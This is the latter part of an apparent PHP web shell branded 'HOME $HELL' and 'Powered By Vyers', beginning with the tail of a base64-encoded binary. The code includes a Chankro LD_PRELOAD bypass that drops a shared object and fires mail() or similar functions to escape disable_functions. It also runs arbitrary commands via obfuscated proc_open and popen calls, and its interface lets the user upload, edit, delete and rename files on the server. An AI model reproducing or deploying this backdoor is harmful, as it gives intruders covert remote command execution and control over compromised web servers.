AAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAMsAAAABAAAAAwAAAAAAAAAQDiAAAAAAABAOAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAADQAAAABgAAAAMAAAAAAAAAGA4gAAAAAAAYDgAAAAAAAMABAAAAAAAABAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAggAAAAEAAAADAAAAAAAAANgPIAAAAAAA2A8AAAAAAAAoAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAANkAAAABAAAAAwAAAAAAAAAAECAAAAAAAAAQAAAAAAAAYAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAADiAAAAAQAAAAMAAAAAAAAAYBAgAAAAAABgEAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAA6AAAAAgAAAADAAAAAAAAAGgQIAAAAAAAaBAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAO0AAAABAAAAMAAAAAAAAAAAAAAAAAAAAGgQAAAAAAAALQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAABAAAAAgAAAAAAAAAAAAAAAAAAAAAAAACYEAAAAAAAABgGAAAAAAAAGwAAAC0AAAAIAAAAAAAAABgAAAAAAAAACQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAsBYAAAAAAABLAgAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABEAAAADAAAAAAAAAAAAAAAAAAAAAAAAAPsYAAAAAAAA9gAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA=';
            $cmyd = $_POST['cmydinpt'];
            $meterpreter = $en($cmyd." > test.txt");
            $viecmprs = '<br><p>Result: <font color="white">base64 : ' . $meterpreter .'</br>Please Refresh and Check File test.txt, this output command<br>test.txt created = VULN<br>test.txt not created = NOT VULN<br>example access: domain.com/yourpath/path/test.txt<br>Powered By Vyers</font><br><br></textarea>';
            $a($full . '/chankro.so', $base($hook));
            $a($full . '/acpid.socket', $base($meterpreter));
            $p('CHANKRO=' . $full . '/acpid.socket');
            $p('LD_PRELOAD=' . $full . '/chankro.so');
            if(function_exists('mail')) {
                $m('a','a','a','a');
            } elseif(function_exists('mb_send_mail')) {
                $mb('a','a','a','a');
            } elseif(function_exists('error_log')) {
                $err('a',1,'a');
            } elseif(function_exists('imap_mail')) {
                $imp('a','a','a');
            }

        }elseif (isset($_POST['delete_file'])) {
            $defiley = $curdirec . '/' . $_POST['delete_file'];
            if (file_exists($defiley)) {
                if (is_dir($defiley)) {
                    if (deldir($defiley)) {
                        echo '<p>Dir deleted</p>';
                    } else {
                        echo '<p>Cannot delete dir</p>';
                    }
                } else {
                    if ($unl($defiley)) {
                        echo '<p>File Deleted</p>';
                    } else {
                        echo '<p>Cannot delete file</p>';
                    }
                }
            } else {
                echo '<p>ERROR: File or dir not found</p>';
            }
        } elseif (isset($_POST['rename_item']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
            $oldnme = $curdirec . '/' . $_POST['old_name'];
            $newnme = $curdirec . '/' . $_POST['new_name'];
            if (file_exists($oldnme)) {
                if (rename($oldnme, $newnme)) {
                    echo '<p>Rename success</p>';
                } else {
                    echo '<p>Rename failed</p>';
                }
            } else {
                echo '<p>Not found</p>';
            }
        }elseif (isset($_POST['cmydpbs'])) {
            $pp = "p"."r"."o"."c"."_"."o"."p"."e"."n";
            $pc = "f"."c"."l"."o"."s"."e";
            $ppc = "p"."r"."o"."c"."_"."c"."l"."o"."s"."e";
            $stg = "s"."t"."r"."e"."a"."m"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
            $popx = "p"."o"."p"."e"."n";
            $pcls = "p"."c"."l"."o"."s"."e";

            $ngaknguk = $_POST['cmydpbs'];
            $descriptorspec = [
                0 => ['pipe', 'r'],
                1 => ['pipe', 'w'],
                2 => ['pipe', 'w']
            ];
            $process = $pp($ngaknguk, $descriptorspec, $lipes);
            if (is_resource($process)) {
                $output = $stg($lipes[1]);
                $errors = $stg($lipes[2]);
                $pc($lipes[1]);
                $pc($lipes[2]);
                $ppc($process);
                if (!empty($errors)) {
                    $viecmprs = '<br><p>ERR: </p><textarea class="result-box">' . $htm($errors) . '</textarea>';
                } else {
                    $viecmprs = '<br><p>Result: </p><textarea class="result-box">' . $htm($output) . '</textarea>';
                }
            } else {
                $handle = $popx($ngaknguk . " 2>&1", 'r');
                if ($handle) {
                    $output = '';
                    while (!feof($handle)) {
                        $output .= fread($handle, 4096);
                    }
                    $pcls($handle);
                    $viecmprs = '<br><p>Result: </p><textarea class="result-box">' . htmlspecialchars($output) . '</textarea>';
                } else {
                    $viecmprs = '<br><p>ERR: Failed to execute! </p>';
                }
            }
        }
        elseif (isset($_POST['view_file'])) {
            $viefis = $curdirec . '/' . $_POST['view_file'];
            if (file_exists($viefis)) {
                $filecont = $fgc($viefis);
                $viecmprs = '<br><p>Result: ' . $_POST['view_file'] . '</p>
                <form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
                <textarea name="content" class="result-box">' . $htm($filecont) . '</textarea><td>
                <input type="hidden" name="edit_file" value="' . $_POST['view_file'] . '">
                <input type="submit" value=" Save "></form></td>';
            } else {
                $viecmprs = '<br><p>File not found</p>';
            }
        }  elseif (isset($_POST['edit_file'])) {
            $ef = $curdirec . '/' . $_POST['edit_file'];
            $newContent = $_POST['content'];
            if ($fpc($ef, $newContent) !== false) {
                echo '<p><i style=color:red;>' . $_POST['edit_file'].' Edited</p>';
            } else {
                echo '<p>Edit file <i style=color:red;> ' . $_POST['edit_file'].' Failed!</p>';

            }
        }

    }

    echo 'Path: ';
    $sulon = $expl(DIRECTORY_SEPARATOR, $curdirec);
    $curpat = '';
    $ngok = false;
    foreach ($sulon as $inex => $okuns) {
        $curpat .= DIRECTORY_SEPARATOR . $okuns;
        if ($inex == 0) {
            echo ' <a href="?d=' . x($curpat) . '">' . $okuns . '</a>';
        } else {
            echo '/<a href="?d=' . x($curpat) . '">' . $okuns . '</a>';
        }
    }

    echo '<a href="?d=' . x($scriptdirs) . '"><font style="color:white";>/</font><span style="color: white;"> [ HOME $HELL ] </span></a> <a href="?logout=1" style="color:red;">[ LOGOUT ]</a>';
    echo '<div style=text-align:right;><form method="post" enctype="multipart/form-data">';
    echo '<input type="file" name="filetos" id="filetos">';
    echo '<input type="submit" value="GO!" name="submit">';
    echo '</form></div>';
    echo '<center><div style="display: flex;justify-content: center; align-items: center; gap: 10px;">
        <form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '" style="display: inline-block;">
            <input type="text" size="72px" name="cmydinpt" placeholder="C0mm4nd byp4ss" style="padding: 8px; margin-right: 8px;">
            <input type="submit" value="GO" style="padding: 8px;height:35px;">
        </form>
        <form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '" style="display: inline-block;">
            <input type="text" size="72px" name="cmydpbs" placeholder="C0mm4nd" style="padding: 8px; margin-right: 8px;">
            <input type="submit" value="GO" style="padding: 8px;height:35px;">
        </form>
        <form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '" style="display: inline-block;">
            <input type="text" size="20px" name="folder_name" placeholder="Create dir" style="padding: 8px; margin-right: 8px;">
            <input type="submit" value="GO" style="padding: 8px;height:35px;">
        </form>
        <form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '" style="display: inline-block;">
            <input type="text" size="20px" name="file_name" placeholder="Create file" style="padding: 8px; margin-right: 8px;">
            <input type="submit" value="GO" style="padding: 8px;height:35px;">
        </form>
    </div></p>';
    echo $viecmprs;
    echo '<table border=1>';
    echo '<br><tr><th><center>Name</th><th><center>Size</th><th><center>Date</th><th>Permissions</th><th><center>View</th><th><center>Delete</th><th><center>Rename</th></tr></center></center></center>';
    foreach ($scd($curdirec) as $v) {
        $u = $ril($v);
        $s = $st($u);
        $itemLink = $isdir($v) ? '?d=' . x($curdirec . '/' . $v) : '?'.('d='.x($curdirec).'&f='.x($v));
        $permission = substr(sprintf('%o', fileperms($u)), -4);
        $writable = $isw($u);
        echo '<tr>
                <td class="item-name"><a href="'.$itemLink.'">'.$v.'</a></td>
                <td class="size">'.filesize($u).'</td>
                <td class="date" style="text-align: center;">'.date('Y-m-d H:i:s', filemtime($u)).'</td>
                <td class="permission '.($writable ? 'writable' : 'not-writable').'">'.$permission.'</td>
                <td><center><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="view_file" value="'.$htm($v).'"><input type="submit" value=" View "></form></center></td>
                <td><center><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="delete_file" value="'.$htm($v).'"><input type="submit" value="Delete"></form></center></td>
                <td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="old_name" value="'.$htm($v).'"><input type="text" name="new_name" placeholder="New name"><input type="submit" name="rename_item" value="Rename"></form></td>
            </tr>';

    }

    echo '</table>';
    function deldir($okuns) {
    $unl = "u"."n"."l"."i"."n"."k";
        if (!file_exists($okuns)) {
            return true;
        }
        if (!is_dir($okuns)) {
            return $unl($okuns);
        }
        $scd = "s"."c"."a"."n"."d"."i"."r";
        foreach ($scd($okuns) as $item) {
            if ($item == '.' || $item == '..') {
                continue;
            }
            if (!deldir($okuns . DIRECTORY_SEPARATOR . $item)) {
                return false;
            }
        }
        return rmdir($okuns);
    }
    ?>